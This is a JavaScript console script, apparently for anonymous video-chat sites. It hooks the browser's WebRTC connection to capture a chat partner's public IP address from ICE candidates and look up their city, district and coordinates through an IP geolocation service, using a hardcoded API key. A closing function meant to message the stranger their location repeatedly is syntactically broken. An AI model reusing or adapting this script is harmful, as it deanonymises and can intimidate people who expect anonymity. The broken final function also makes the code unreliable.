let apiKey = "8d16040764634946a3c9267019e4dbc3";
 
window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;
 
window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);
 
  pc.oaddIceCandidate = pc.addIceCandidate;
 
  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");
 
    console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};
 
let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
 
  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
      console.log(output);
    })
  );
}; 
 
function writeMessage(country,region,city)
{
	let chatmsg = document.getElementsByClassName("chatmsg");
	let sendbtn = document.getElementsByClassName("sendbtn");
	let msg = "I think you are from "json.state_prov","json.district".("json.country_name"), Please confirm to talk to a real person";
	for(let i=1; i<10; i++)
	{
		chatmsg[0].innerHTML = msg;
	sendbtn[0].click();
	}
	
}
